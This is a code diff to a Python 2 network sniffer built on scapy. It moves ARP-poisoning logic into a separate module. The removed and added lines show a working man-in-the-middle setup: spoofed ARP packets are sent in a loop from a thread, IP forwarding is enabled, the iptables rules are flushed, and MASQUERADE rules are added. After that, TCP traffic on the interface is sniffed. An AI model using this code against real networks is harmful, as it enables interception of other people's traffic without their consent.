@@ -20,8 +20,8 @@ import os
 import glob
 import time
 from threading import Thread
+from arp import ArpPoisoning
 
-conf.verb = 0
 loadedModules = []
 
 def analyze(packet):
@@ -31,31 +31,23 @@ def analyze(packet):
     except:
         pass
 
-def poison(packet):
-    while True:
-        send(packet, verbose=False)
-        time.sleep(5)
-
 def startNetwork(interface, arp):
-
-    # ARP poisoning preparation
-    t = None
-    if arp != None:
-        try:
-            ips = arp.split('-')
-            packet = ARP()
-            packet.pdst = ips[0]
-            packet.psrc = ips[1]
-            print "[*] Start arp poisoning"
-            t = Thread(target=poison, args =(packet))
-            t.start()
-        except:
-            t = None
-            print "[!] ARP poisoning failed"
-
-    # Sniffing packets
-    print "[*] Start sniffind on %s" % interface
     try:
+        # ARP poisoning preparation
+        t = None
+        if arp != None:
+            try:
+                ips = arp.split('-')
+                packet = ArpPoisoning.getPacket(ips[1], ips[0])
+                print "[*] Start arp poisoning"
+                t = Thread(target=ArpPoisoning.inject, args =(packet))
+                t.start()
+            except:
+                t = None
+                print "[!] ARP poisoning failed"
+
+        # Sniffing packets
+        print "[*] Start sniffind on %s" % interface
         sniff(prn=analyze, store=0, iface=interface, filter="tcp")
     except KeyboardInterrupt:
         print "[*] Stop Sniffing"
@@ -87,19 +79,6 @@ def listModules():
     for module in loadedModules:
         print "    |-%s" % module.getDescription()
 
-def configureRouting(interface):
-    # forwarding conf
-    f = open('/proc/sys/net/ipv4/ip_forward', 'w')
-    f.write('1')
-    f.close()
-
-    # iptables conf
-    os.system("/sbin/iptables --flush")
-    os.system("/sbin/iptables -t nat --flush")
-    os.system("/sbin/iptables --zero")
-    os.system("/sbin/iptables -A FORWARD --in-interface " +  interface + " -j ACCEPT")
-    os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + interface + " -j MASQUERADE")
-
 if __name__ == '__main__':
     
     parser = argparse.ArgumentParser(description='Simple live network sniffer')
@@ -120,10 +99,10 @@ if __name__ == '__main__':
         sys.exit(0)
 
     if args.interface != None:
-
+        # configure routing and iptables for arp poisoning
         if args.arp != None:
-            configureRouting(args.interface)
-
+            ArpPoisoning.configure(args.interface)
+        # Start sniffing and arp poisoning
         startNetwork(args.interface, args.arp)
     else:
         print "[!] You must enter a valid interface using -i (ex: -i mon0)"
